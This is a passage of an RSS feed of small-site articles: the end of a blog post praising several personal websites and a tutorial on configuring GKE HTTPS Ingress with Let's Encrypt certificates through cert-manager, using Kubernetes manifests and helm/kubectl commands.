      <a href="https://healeycodes.com/static/b8e7b3aa62f5210ac62bb4003ff06458/0f09e/arcana.computer.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The index page of arcana.computer." title="The index page of arcana.computer." src="https://healeycodes.com/static/b8e7b3aa62f5210ac62bb4003ff06458/0f09e/arcana.computer.png" srcset="https://healeycodes.com/static/b8e7b3aa62f5210ac62bb4003ff06458/a8a0d/arcana.computer.png 300w,
https://healeycodes.com/static/b8e7b3aa62f5210ac62bb4003ff06458/dface/arcana.computer.png 600w,
https://healeycodes.com/static/b8e7b3aa62f5210ac62bb4003ff06458/0f09e/arcana.computer.png 640w" sizes="(max-width: 640px) 100vw, 640px" loading="lazy">
  </a>
    </span></p>
<p>My philosophy towards personal websites matches Justin’s. He writes:</p>
<blockquote>
<p>Lastly, if there’s anything I can convince you of: you should build a personal site, you should obsess over it, you should meticulously document it, and you should have quite a bit of fun doing so. (It’s worth it.)</p>
</blockquote>
<p>The content throughout these pages is personal and reads true. Although it’s not a journal as such, as I read through the notes and reviews I get a secret feeling that I’m looking somewhere I shouldn’t be — like peeking in a hidden diary.</p>
<p>Justin writes about capturing his <a href="https://arcana.computer/catalogs/media-diet">media diet</a>:</p>
<blockquote>
<p>This started out as a lazy compulsion, but I’ve grown rather found of this habit over time. “You are what you eat”, and all that — I’ve realized that paying more attention to how I’m spending my consumptive time has made me more focused on consuming what I’m interested in, and not simply what’s easiest.</p>
</blockquote>
<p>He talks about reviewing older sections of his media diet and how it helps him recollect that time in his life — “suddenly I am taken back to my old apartment on Capitol Hill, and my three weeks of funemployment before Stripe”. When coming across old words that I have written, I’ve also experienced this almost-olfactory flashback of thoughts.</p>
<p><span>
      <a href="https://healeycodes.com/static/afac4baa0719fea86b4df3c67c83ee57/c9fe3/catalog.arcana.computer.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The catalog listing of arcana.computer." title="The catalog listing of arcana.computer." src="https://healeycodes.com/static/afac4baa0719fea86b4df3c67c83ee57/c9fe3/catalog.arcana.computer.png" srcset="https://healeycodes.com/static/afac4baa0719fea86b4df3c67c83ee57/c9fe3/catalog.arcana.computer.png 298w" sizes="(max-width: 298px) 100vw, 298px" loading="lazy">
  </a>
    </span></p>
<p>Overall, I am impressed with the breadth and depth of content on Justin’s website, as well as how he’s made Airtable work for him. I also like that sections are marked as in-progress. I like the personal structure to it. His methods for working on this website are similar to the goals of the <a href="https://en.wikipedia.org/wiki/Long_Now_Foundation">Long Now</a> and that gels with me.</p>

<p>Paul Stamatiou writes long form articles about his life and technology. If someone has a curiosity about a subject that he has covered (e.g. <a href="https://paulstamatiou.com/made-on-an-ipad-pro/">creating with the iPad Pro</a>, or <a href="https://paulstamatiou.com/building-a-windows-10-lightroom-photo-editing-pc/">building a lightroom PC</a>) I wouldn’t hesitate linking one of his articles to them — perhaps without even reading it — because of the consistent high quality I have come to expect.</p>
<p><span>
      <a href="https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/e9985/paulstamatiou.com.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Paul Stamatiou's website." title="Paul Stamatiou's website." src="https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/e9985/paulstamatiou.com.png" srcset="https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/a8a0d/paulstamatiou.com.png 300w,
https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/dface/paulstamatiou.com.png 600w,
https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/e9985/paulstamatiou.com.png 750w" sizes="(max-width: 750px) 100vw, 750px" loading="lazy">
  </a>
    </span></p>
<p>However, this quality comes with a cost, as he describes in <a href="https://paulstamatiou.com/writing-more/">Writing more</a>:</p>
<blockquote>
<p>I’m going to try something different and write more short-form posts here.</p>
</blockquote>
<blockquote>
<p>Over the years my focus has been increasing the quality of my articles. They’ve ended up becoming increasingly time-consuming to create.</p>
</blockquote>
<p>Although these articles (which for now he seems to have dubbed “briefs”) are shorter and less researched than his other writing they read as complete entries to me. On another website, by another person, they would be complete blog posts.</p>
<p>The more things I write, the more hesitant I am to actually publish. So the way he talks about blogging in <em>Writing more</em> resonates with me:</p>
<blockquote>
<p>I want to get back to what blogging felt like when I started in 2005. Back when posting a few sentences and publishing it within the same computing session was so easy and fun. Where expectations were low and it didn’t have to be perfect.</p>
</blockquote>
<p>He has written 1210 posts since 2005. My first thought goes to the build times of such a website! In 2011, he migrated from <a href="https://paulstamatiou.com/how-to-wordpress-to-jekyll/">Wordpress to Jekyll</a>. This year he <a href="https://twitter.com/Stammy/status/1307347164599922689">tweeted</a> that he’s looking at moving again:</p>
<blockquote>
<p>really, really want to migrate my jekyll blog to Hugo + Netlify but I have so many weird jekyll hacks and collections and templates/includes that I’m sure the migration would take months of spare time.</p>
</blockquote>
<blockquote>
<p>probably faster to build a new site from the ground up, new CSS and all</p>
</blockquote>
<p>Also this year, he was interviewed about his work (he’s a designer at Twitter) and about his blog on <a href="https://www.thundernerds.io/2019/10/writing-a-blog-and-working-at-twitter-with-paul-stamatiou/">Thunder Nerds</a>. (More people should be interviewed about their technology blogs please.)</p>
<p>Paul is a photographer who generates fantastic photo sets and write ups with little animated maps of the location. His <a href="https://paulstamatiou.com/photos/">photos</a>, and the way they are arranged, is truly fantastic. He has of course written <a href="https://paulstamatiou.com/photos/gear/">thousands of words</a> about his camera gear.</p>

<p>Martin Tournoij is the creator of <a href="https://www.goatcounter.com/">Goat Counter</a> and has posts dating back to 2013. His personal website is Jekyll-based and <a href="https://github.com/arp242/arp242.net">open source</a>. I usually run into his writing on <a href="https://lobste.rs/">lobste.rs</a> (a computing-focused community).</p>
<p><span>
      <a href="https://healeycodes.com/static/bffb8b2be9678c53176ffceff4411c15/86b21/arp242-posts.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Posts by Martin Tournoij" title="Posts by Martin Tournoij" src="https://healeycodes.com/static/bffb8b2be9678c53176ffceff4411c15/86b21/arp242-posts.png" srcset="https://healeycodes.com/static/bffb8b2be9678c53176ffceff4411c15/a8a0d/arp242-posts.png 300w,
https://healeycodes.com/static/bffb8b2be9678c53176ffceff4411c15/86b21/arp242-posts.png 427w" sizes="(max-width: 427px) 100vw, 427px" loading="lazy">
  </a>
    </span></p>
<p>I like the one-page layout of the landing page. There’s a list of posts and projects, a picture, and a link to his CV. My favorite post of his is <a href="https://www.arp242.net/personal-analytics.html">Analytics on personal websites</a> — where he argues in part for vanity statistics:</p>
<blockquote>
<p>As for “vanity stats” or “stats to stroke your ego”: I think that’s actually a valid use case as well. After you spent quite a bit of your spare time writing an article it’s just nice to know people are actually reading it. There’s nothing wrong with being validated – it’s a basic psychological need and I’m not a fan of casually dismissing it.</p>
</blockquote>
<p>Later on, he wrestles with the fact that since he’s the creator of an analytics tool, he doesn’t want this website to turn into an advertising channel for it.</p>
<p>Martin doesn’t shy away from controversial subjects on his blog. He writes about freedom and democracy, he pushes for empathy towards those he disagrees with. He writes without restraint which is admirable in itself.</p>
<p>He uses his own CSS template (<a href="https://github.com/arp242/hello-css">arp242/hello-css</a>) which is worth a look. If you’ll allow me to use a vague statement, his website has a unique visual readability to it.</p>

<p>Joel Califa’s website has whimsy. It doesn’t take itself seriously.</p>
<p><span>
      <a href="https://healeycodes.com/static/661e12b5960abce128d537bca7de1fb1/44bb2/joel-buttons.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The third section of Joel Califa's website" title="The third section of Joel Califa's website" src="https://healeycodes.com/static/661e12b5960abce128d537bca7de1fb1/44bb2/joel-buttons.png" srcset="https://healeycodes.com/static/661e12b5960abce128d537bca7de1fb1/a8a0d/joel-buttons.png 300w,
https://healeycodes.com/static/661e12b5960abce128d537bca7de1fb1/dface/joel-buttons.png 600w,
https://healeycodes.com/static/661e12b5960abce128d537bca7de1fb1/44bb2/joel-buttons.png 636w" sizes="(max-width: 636px) 100vw, 636px" loading="lazy">
  </a>
    </span></p>
<p>Clicking this button makes text spawn and fly away and fade (the snippets are things from the old web like: <code>&lt;i&gt;</code>, <code>&lt;frameset&gt;</code>, <code>&lt;marquee&gt;</code>, etc). There’s an illustration of his head that hides away when you hover near. The writing in the section headers frizzles with energy.</p>
<p>Joel’s website successfully serves as both a work portfolio and a design blog. His <em>Work</em> page describes itself as a “A sample of text-heavy case studies for patient visitors.” The design blog has “Low frequency, high quality design articles.”</p>
<p>My favorite post is <a href="http://joelcalifa.com/blog/tiny-wins/">Tiny Wins</a>:</p>
<blockquote>
<p>I recently shipped two things at GitHub that had an impact beyond my wildest dreams.</p>
</blockquote>
<p>Where he discusses the work involved in designing dynamic favicons for the Pull Request page:</p>
<blockquote>
<p>Now browser tabs will always show a PR’s current build status.</p>
</blockquote>
<p>As well as adding an arrow that signals which branch your changes are “flowing” into:</p>
<blockquote>
<p>Before releasing this, people would regularly confuse which branch would be merged into which.</p>
</blockquote>
<p>He writes with authentic authority. He covers subjects that seem so obvious after you read them. Like in <a href="http://joelcalifa.com/blog/revisiting-visited/">Revisiting :Visited</a>, where research, the web specification, and its practical uses, are combined:</p>
<blockquote>
<p>A Nielsen study summed this up nicely over ten years ago, “People get lost and move in circles when websites use the same link color for visited and new destinations. To reduce navigational confusion, select different colors for the two types of links.”</p>
</blockquote>
<blockquote>
<p>Can’t we, as an industry, get behind that reasoning? A “visited” link isn’t that far off from a “read” email. They both provide the user with the tacit understanding of where they’ve been.</p>
</blockquote>
<p>Joel exists in the wonderful space between technology and design where he is addressing problems that directly relate to me. For example, his website is the first place I read <a href="http://joelcalifa.com/blog/unsolicited-dating-advice/">a serious defense</a> of the <code>month/day/year</code> date ordering system.</p>
<p>It fills me with joy that I have only read half of his content.</p>

<p>Rasmus Andersson has the prettiest website in this list. An elegant three-column layout that perfectly scales to the browser’s width — dropping to two columns then one column. When a page is selected from the top right menu, the background changes to a rich color and shifts the menu up or down. With a wide enough browser, gray bars frame the website on either side.</p>
<p><span>
      <a href="https://healeycodes.com/static/5eb9bc142adf81fa12688351b5855032/c3678/rasmus-menu.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="rsms.me main menu." title="rsms.me main menu." src="https://healeycodes.com/static/5eb9bc142adf81fa12688351b5855032/c3678/rasmus-menu.png" srcset="https://healeycodes.com/static/5eb9bc142adf81fa12688351b5855032/c3678/rasmus-menu.png 159w" sizes="(max-width: 159px) 100vw, 159px" loading="lazy">
  </a>
    </span></p>
<p>Rasmus is the creator of the <a href="https://rsms.me/inter/">Inter</a> font and uses it to great effect with bold hover colors.</p>
<p><span>
      <a href="https://healeycodes.com/static/3f98abac143b4a634a29dfb50c968083/d00c8/rasmus-hover.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="rsms.me hover effects." title="rsms.me hover effects." src="https://healeycodes.com/static/3f98abac143b4a634a29dfb50c968083/d00c8/rasmus-hover.png" srcset="https://healeycodes.com/static/3f98abac143b4a634a29dfb50c968083/d00c8/rasmus-hover.png 273w" sizes="(max-width: 273px) 100vw, 273px" loading="lazy">
  </a>
    </span></p>
<p>Even his <a href="https://rsms.me/bad-url">404 page</a> is sharp.</p>
<p>After looking around more, I found a <code>&lt;script&gt;</code> tag that includes <a href="https://rsms.me/res/main.js">main.js</a>, a debug tool that must have been used to develop the grid layout (which I think is based on <a href="https://rsms.me/raster/">rsms/raster</a>). Pressing alt+D or alt+G overlays a system of boxes and dots.</p>
<p><span>
      <a href="https://healeycodes.com/static/5277a17e627e19500b115f94e8664dd1/1075d/rasmus-boxes.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Debug boxes and dots over the post list." title="Debug boxes and dots over the post list." src="https://healeycodes.com/static/5277a17e627e19500b115f94e8664dd1/1075d/rasmus-boxes.png" srcset="https://healeycodes.com/static/5277a17e627e19500b115f94e8664dd1/a8a0d/rasmus-boxes.png 300w,
https://healeycodes.com/static/5277a17e627e19500b115f94e8664dd1/1075d/rasmus-boxes.png 376w" sizes="(max-width: 376px) 100vw, 376px" loading="lazy">
  </a>
    </span></p>
<p>Rasmus’s last post was in 2017 — <a href="https://rsms.me/wasm-intro">Introduction to WebAssembly</a> — but it’s one that I revisit often as it’s a clear and detailed explanation of the technology.</p>
<p>His use of the right arrow symbol (U+2192) as well as the rounded hover effect on titles (e.g. “Projects” and “Thoughts and ideas”) is something that I closely copied for my own website as it is just too perfect.</p>
<p>Like Paul Stamatiou, Rasmus has hundreds of articles and has been blogging for a long time – almost two decades. The earlier posts are more likely to be reblogs, quotes, links, and small thoughts. The kind of things that Twitter is now used for.</p>
<p>Unlike Twitter, the permanence of these small thoughts is poetic. Here, in 2002, a new font is announced next to something like a diary entry without a paragraph break in between:</p>
<blockquote>
<p>I’ve completed a new typeface. It’s a sweet little thing called Hovden Stitch. Yes your guess was correct. It looks like stitches, cross-stitches to be precise. Go get it for your mac or pc right here. Yesterday I hung out on a free festival here in Trollhättan. Laurel Music was great. Paola sucked. Laurel Music is playing …</p></blockquote></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://healeycodes.com/personal-websites-and-internet-writing/">https://healeycodes.com/personal-websites-and-internet-writing/</a></em></p>]]>
            </description>
            <link>https://healeycodes.com/personal-websites-and-internet-writing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25555725</guid>
            <pubDate>Mon, 28 Dec 2020 01:00:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GKE HTTPS Ingress with LetsEncrypt using cert-manager]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25555628">thread link</a>) | @motte
<br/>
December 27, 2020 | https://kosyfrances.github.io/ingress-gce-letsencrypt/ | <a href="https://web.archive.org/web/*/https://kosyfrances.github.io/ingress-gce-letsencrypt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div> <nav> <ul> <li> <a href="https://kosyfrances.github.io/">Home</a> </li> <li> <a href="https://kosyfrances.github.io/blog">Blog</a> </li> <li> <a href="https://kosyfrances.github.io/memoirs">Memoirs</a> </li> <li> <a href="https://kosyfrances.github.io/about">About</a> </li> </ul> </nav>  <p><span> <time datetime="16-03-2020">Monday. March 16, 2020</time> - <span title="Estimated read time"> 10 mins </span> </span></p> <h2 id="introduction">Introduction</h2> <p><a href="https://cloud.google.com/kubernetes-engine">Google Kubernetes Engine (GKE)</a> provides a built-in and managed Ingress controller called GKE Ingress. When you create an Ingress object, the GKE Ingress controller creates a Google Cloud HTTP(S) load balancer and configures it according to the information in the Ingress and its associated Services.</p> <p>This article describes how to setup Ingress for External HTTP(S) Load Balancing, install cert-manager certificate provisioner and setup up a Let’s Encrypt certificate. This was written based on GKE <a href="https://cloud.google.com/kubernetes-engine/docs/release-notes-stable#february_11_2020">v1.14.10-gke.17</a>, <a href="https://cert-manager.io/">cert-manager</a> v0.13 and <a href="https://helm.sh/">Helm</a> v3.</p> <h2 id="prerequisites">Prerequisites</h2> <ul> <li><a href="https://cloud.google.com/kubernetes-engine/docs/how-to/creating-a-cluster">A GKE Kubernetes cluster</a></li> <li><a href="https://helm.sh/docs/intro/install/">Helm</a></li> <li><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/">Kubectl</a></li> <li><a href="https://cloud.google.com/compute/docs/ip-addresses/reserve-static-external-ip-address">A global static IP</a> with <a href="https://cloud.google.com/kubernetes-engine/docs/tutorials/configuring-domain-name-static-ip#step_4_configure_your_domain_name_records">DNS configured</a> for your domain for example, as example.your-domain.com. Regional IP addresses do not work with GKE Ingress.</li> </ul> <p>Note that a Service exposed through an Ingress must respond to health checks from the load balancer. According to the <a href="https://cloud.google.com/kubernetes-engine/docs/concepts/ingress#health_checks">docs</a>, your app must either serve a response with an HTTP 200 status to GET requests on the / path, or you can configure an HTTP readiness probe, serving a response with an HTTP 200 status to GET requests on the path specified by the readiness probe.</p> <h2 id="create-a-deployment">Create a deployment</h2> <p>Here is an example of a sample deployment manifest.</p> <div><div><pre><code><span>apiVersion</span><span>:</span> <span>apps/v1</span>
<span>kind</span><span>:</span> <span>Deployment</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>sample-deployment</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>sampleApp</span>
<span>spec</span><span>:</span>
  <span>replicas</span><span>:</span> <span>1</span>
  <span>selector</span><span>:</span>
    <span>matchLabels</span><span>:</span>
      <span>app</span><span>:</span> <span>sampleApp</span>
  <span>template</span><span>:</span>
    <span>metadata</span><span>:</span>
      <span>labels</span><span>:</span>
        <span>app</span><span>:</span> <span>sampleApp</span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
      <span>-</span> <span>name</span><span>:</span> <span>sampleContainer</span>
        <span>image</span><span>:</span> <span>nginx:1.7.9</span>
        <span>ports</span><span>:</span>
        <span>-</span> <span>name</span><span>:</span> <span>http</span>
          <span>containerPort</span><span>:</span> <span>8080</span>
          <span>protocol</span><span>:</span> <span>TCP</span>
        <span>readinessProbe</span><span>:</span>
          <span>httpGet</span><span>:</span>
            <span>path</span><span>:</span> <span>/healthz</span>
            <span>port</span><span>:</span> <span>8080</span>
          <span>initialDelaySeconds</span><span>:</span> <span>5</span>
          <span>periodSeconds</span><span>:</span> <span>5</span>
</code></pre></div></div> <h2 id="create-a-service">Create a service</h2> <p>Here is an example of a sample service manifest.</p> <div><div><pre><code><span>apiVersion</span><span>:</span> <span>v1</span>
<span>kind</span><span>:</span> <span>Service</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>sampleApp-service</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>sampleApp</span>
<span>spec</span><span>:</span>
  <span>type</span><span>:</span> <span>NodePort</span>
  <span>selector</span><span>:</span>
    <span>app</span><span>:</span> <span>sampleApp</span>
  <span>ports</span><span>:</span>
    <span>-</span> <span>name</span><span>:</span> <span>http</span>
      <span>protocol</span><span>:</span> <span>TCP</span>
      <span>port</span><span>:</span> <span>8080</span>
      <span>targetPort</span><span>:</span> <span>8080</span>
</code></pre></div></div> <h2 id="install-cert-manager">Install cert-manager</h2> <p>cert-manager runs within your Kubernetes cluster as a series of deployment resources. It utilizes <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/">CustomResourceDefinitions</a> to configure Certificate Authorities and request certificates. The following steps <a href="https://cert-manager.io/docs/installation/kubernetes/">installs cert-manager</a> on your Kubernetes cluster.</p> <ul> <li>Install the CustomResourceDefinition resources separately. <div><div><pre><code>  kubectl apply <span>--validate</span><span>=</span><span>false</span> <span>\</span>
  <span>-f</span> https://raw.githubusercontent.com/jetstack/cert-manager/v0.13.1/deploy/manifests/00-crds.yaml
</code></pre></div> </div> </li> <li>Create the namespace for cert-manager. <div><div><pre><code>  kubectl create namespace cert-manager
</code></pre></div> </div> </li> <li>Add the Jetstack Helm repository. <div><div><pre><code>  helm repo add jetstack https://charts.jetstack.io
</code></pre></div> </div> </li> <li>Update your local Helm chart repository cache.  </li> <li>Install the cert-manager Helm chart. <div><div><pre><code>  helm <span>install</span> <span>\</span>
    cert-manager jetstack/cert-manager <span>\</span>
    <span>--namespace</span> cert-manager <span>\</span>
    <span>--version</span> v0.13.1
</code></pre></div> </div> </li> <li>Verify the installation. <div><div><pre><code>  <span>$ </span>kubectl get pods <span>--namespace</span> cert-manager
  NAME                                       READY   STATUS    RESTARTS   AGE
  cert-manager-5c6866597-zw7kh               1/1     Running   0          2m
  cert-manager-cainjector-577f6d9fd7-tr77l   1/1     Running   0          2m
  cert-manager-webhook-787858fcdb-nlzsq      1/1     Running   0          2m
</code></pre></div> </div> <p>You should see the cert-manager, cert-manager-cainjector, and cert-manager-webhook pod in a Running state. It may take a minute or so for the TLS assets required for the webhook to function to be provisioned.</p> </li> <li>Create an <a href="https://cert-manager.io/docs/concepts/issuer/">Issuer</a> to test the webhook works okay. <div><div><pre><code>  <span>cat &lt;&lt;EOF &gt; test-resources.yaml</span>
  <span>apiVersion</span><span>:</span> <span>v1</span>
  <span>kind</span><span>:</span> <span>Namespace</span>
  <span>metadata</span><span>:</span>
    <span>name</span><span>:</span> <span>cert-manager-test</span>
  <span>---</span>
  <span>apiVersion</span><span>:</span> <span>cert-manager.io/v1alpha2</span>
  <span>kind</span><span>:</span> <span>Issuer</span>
  <span>metadata</span><span>:</span>
    <span>name</span><span>:</span> <span>test-selfsigned</span>
    <span>namespace</span><span>:</span> <span>cert-manager-test</span>
  <span>spec</span><span>:</span>
    <span>selfSigned</span><span>:</span> <span>{}</span>
  <span>---</span>
  <span>apiVersion</span><span>:</span> <span>cert-manager.io/v1alpha2</span>
  <span>kind</span><span>:</span> <span>Certificate</span>
  <span>metadata</span><span>:</span>
    <span>name</span><span>:</span> <span>selfsigned-cert</span>
    <span>namespace</span><span>:</span> <span>cert-manager-test</span>
  <span>spec</span><span>:</span>
    <span>dnsNames</span><span>:</span>
      <span>-</span> <span>example.com</span>
    <span>secretName</span><span>:</span> <span>selfsigned-cert-tls</span>
    <span>issuerRef</span><span>:</span>
      <span>name</span><span>:</span> <span>test-selfsigned</span>
  <span>EOF</span>
</code></pre></div> </div> </li> <li>Create the test resources. <div><div><pre><code>  kubectl apply <span>-f</span> test-resources.yaml
</code></pre></div> </div> </li> <li>Check the status of the newly created certificate. You may need to wait a few seconds before cert-manager processes the certificate request. <div><div><pre><code>  <span>$ </span>kubectl describe certificate <span>-n</span> cert-manager-test

  ...
  Spec:
    Common Name:  example.com
    Issuer Ref:
      Name:       test-selfsigned
    Secret Name:  selfsigned-cert-tls
  Status:
    Conditions:
      Last Transition Time:  2020-01-29T17:34:30Z
      Message:               Certificate is up to <span>date </span>and has not expired
      Reason:                Ready
      Status:                True
      Type:                  Ready
    Not After:               2020-04-29T17:34:29Z
  Events:
    Type    Reason      Age   From          Message
    <span>----</span>    <span>------</span>      <span>----</span>  <span>----</span>          <span>-------</span>
    Normal  CertIssued  4s    cert-manager  Certificate issued successfully
</code></pre></div> </div> </li> <li>Clean up the test resources. <div><div><pre><code>  kubectl delete <span>-f</span> test-resources.yaml
</code></pre></div> </div> </li> </ul> <p>If all the above steps have completed without error, you are good to go!</p> <h2 id="create-issuer">Create issuer</h2> <p>The Let’s Encrypt production issuer has very strict <a href="https://letsencrypt.org/docs/rate-limits/">rate limits</a>. When you are experimenting and learning, it is very easy to hit those limits, and confuse rate limiting with errors in configuration or operation. Start with <a href="https://letsencrypt.org/docs/staging-environment/">Let’s Encrypt staging</a> environment and switch to Let’s Encrypt production after it works fine. In this article, we will be creating a <a href="https://docs.cert-manager.io/en/release-0.11/reference/clusterissuers.html">ClusterIssuer</a>.</p> <p>Create a clusterissuer definition and update the email address to your own. This email is required by Let’s Encrypt and used to notify you of certificate expiration and updates.</p> <div><div><pre><code><span>cat &lt;&lt;EOF &gt; clusterissuer.yaml</span>
<span>apiVersion</span><span>:</span> <span>cert-manager.io/v1alpha2</span>
<span>kind</span><span>:</span> <span>ClusterIssuer</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>letsencrypt-staging</span>
<span>spec</span><span>:</span>
  <span>acme</span><span>:</span>
    <span># The ACME server URL</span>
    <span>server</span><span>:</span> <span>https://acme-staging-v02.api.letsencrypt.org/directory</span>
    <span># Email address used for ACME registration</span>
    <span>email</span><span>:</span> <span>you@youremail.com</span> <span># Update to yours</span>
    <span># Name of a secret used to store the ACME account private key</span>
    <span>privateKeySecretRef</span><span>:</span>
      <span>name</span><span>:</span> <span>letsencrypt-staging</span>
    <span># Enable the HTTP-01 challenge provider</span>
    <span>solvers</span><span>:</span>
    <span>-</span> <span>http01</span><span>:</span>
        <span>ingress</span><span>:</span>
            <span>class</span><span>:</span> <span>ingress-gce</span>
<span>EOF</span>
</code></pre></div></div> <p>Once edited, apply the custom resource:</p> <div><div><pre><code>kubectl apply <span>-f</span> clusterissuer.yaml
</code></pre></div></div> <p>Check on the status of the clusterissuer after you create it:</p> <div><div><pre><code><span>$ </span>kubectl describe clusterissuer letsencrypt-staging

Name:         letsencrypt-staging
...
Status:
  Acme:
    Last Registered Email:  you@youremail.com
    Uri:                    https://acme-staging-v02.api.letsencrypt.org/acme/acct/123456
  Conditions:
    Last Transition Time:  2020-02-24T18:33:56Z
    Message:               The ACME account was registered with the ACME server
    Reason:                ACMEAccountRegistered
    Status:                True
    Type:                  Ready
Events:                    &lt;none&gt;
</code></pre></div></div> <p>You should see the issuer listed with a registered account.</p> <h2 id="deploy-a-tls-ingress-resource">Deploy a TLS Ingress Resource</h2> <p>Create an <a href="https://kubernetes.io/docs/concepts/services-networking/ingress/">ingress</a> definition.</p> <div><div><pre><code><span>cat &lt;&lt;EOF &gt; ingress.yaml</span>
<span>apiVersion</span><span>:</span> <span>extensions/v1beta1</span>
<span>kind</span><span>:</span> <span>Ingress</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>sampleApp-ingress</span>
  <span>annotations</span><span>:</span>
    <span># specify the name of the global IP address resource to be associated with the HTTP(S) Load Balancer.</span>
    <span>kubernetes.io/ingress.global-static-ip-name</span><span>:</span> <span>sampleApp-ip</span>
    <span># add an annotation indicating the issuer to use.</span>
    <span>cert-manager.io/cluster-issuer</span><span>:</span> <span>letsencrypt-staging</span>
    <span># controls whether the ingress is modified ‘in-place’,</span>
    <span># or a new one is created specifically for the HTTP01 challenge.</span>
    <span>acme.cert-manager.io/http01-edit-in-place</span><span>:</span> <span>"</span><span>true"</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>sampleApp</span>
<span>spec</span><span>:</span>
  <span>tls</span><span>:</span> <span># &lt; placing a host in the TLS config will indicate a certificate should be created</span>
  <span>-</span> <span>hosts</span><span>:</span>
    <span>-</span> <span>example.example.com</span>
    <span>secretName</span><span>:</span> <span>sampleApp-cert-secret</span> <span># &lt; cert-manager will store the created certificate in this secret</span>
  <span>rules</span><span>:</span>
  <span>-</span> <span>host</span><span>:</span> <span>example.example.com</span>
    <span>http</span><span>:</span>
      <span>paths</span><span>:</span>
      <span>-</span> <span>path</span><span>:</span> <span>sample/app/path/*</span>
        <span>backend</span><span>:</span>
          <span>serviceName</span><span>:</span> <span>sampleApp-service</span>
          <span>servicePort</span><span>:</span> <span>8080</span>
<span>EOF</span>
</code></pre></div></div> <p>Once edited, apply ingress resource.</p> <div><div><pre><code>kubectl apply <span>-f</span> ingress.yaml
</code></pre></div></div> <h2 id="verify">Verify</h2> <p>View certificate.</p> <div><div><pre><code><span>$ </span>kubectl get certificate
NAME                    READY     SECRET                AGE
sampleApp-cert-secret   True      sampleApp-cert-secret   6m34s
</code></pre></div></div> <p>Describe certificate.</p> <div><div><pre><code><span>$ </span>kubectl describe certificate sampleApp-cert-secret
Name:         sampleApp-cert-secret
...
Status:
  Conditions:
    Last Transition Time:  2020-03-02T16:30:01Z
    Message:               Certificate is up to <span>date </span>and has not expired
    Reason:                Ready
    Status:                True
    Type:                  Ready
  Not After:               2020-05-24T17:55:46Z
Events:                    &lt;none&gt;
</code></pre></div></div> <p>Describe secrets created by cert manager.</p> <div><div><pre><code><span>$ </span>kubectl describe secret sampleApp-cert-secret

Name:         sampleApp-cert-secret
...
Type:  kubernetes.io/tls

Data
<span>====</span>
ca.crt:   0 bytes
tls.crt:  3598 bytes
tls.key:  1675 bytes
</code></pre></div></div> <h2 id="switch-to-lets-encrypt-prod">Switch to Let’s Encrypt Prod</h2> <p>Now that we are sure that everything is configured correctly, you can update the annotations in the ingress to specify the production issuer:</p> <div><div><pre><code><span>apiVersion</span><span>:</span> <span>extensions/v1beta1</span>
<span>kind</span><span>:</span> <span>Ingress</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>sampleApp-ingress</span>
  <span>annotations</span><span>:</span>
    <span>kubernetes.io/ingress.global-static-ip-name</span><span>:</span> <span>sampleApp-ip</span>
    <span>cert-manager.io/cluster-issuer</span><span>:</span> <span>letsencrypt-prod</span>
    <span>acme.cert-manager.io/http01-edit-in-place</span><span>:</span> <span>"</span><span>true"</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>sampleApp</span>
<span>spec</span><span>:</span>
  <span>tls</span><span>:</span>
  <span>-</span> <span>hosts</span><span>:</span>
    <span>-</span> <span>example.example.com</span>
    <span>secretName</span><span>:</span> <span>sampleApp-cert-secret</span>
  <span>rules</span><span>:</span>
  <span>-</span> <span>host</span><span>:</span> <span>example.example.com</span>
    <span>http</span><span>:</span>
      <span>paths</span><span>:</span>
      <span>-</span> <span>path</span><span>:</span> <span>sample/app/path/*</span>
        <span>backend</span><span>:</span>
          <span>serviceName</span><span>:</span> <span>sampleApp-service</span>
          <span>servicePort</span><span>:</span> <span>8080</span>
</code></pre></div></div> <div><div><pre><code><span>$ </span>kubectl create <span>--edit</span> <span>-f</span> ingress.yaml
ingress.extensions <span>"sampleApp-ingress"</span> configured
</code></pre></div></div> <p>You will also need to delete the existing secret, which cert-manager is watching. This will cause it to reprocess …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kosyfrances.github.io/ingress-gce-letsencrypt/">https://kosyfrances.github.io/ingress-gce-letsencrypt/</a></em></p>]]>
            </description>
            <link>https://kosyfrances.github.io/ingress-gce-letsencrypt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25555628</guid>
            <pubDate>Mon, 28 Dec 2020 00:46:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mobile-First (and why it's a bad idea)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25555623">thread link</a>) | @taphangum
<br/>
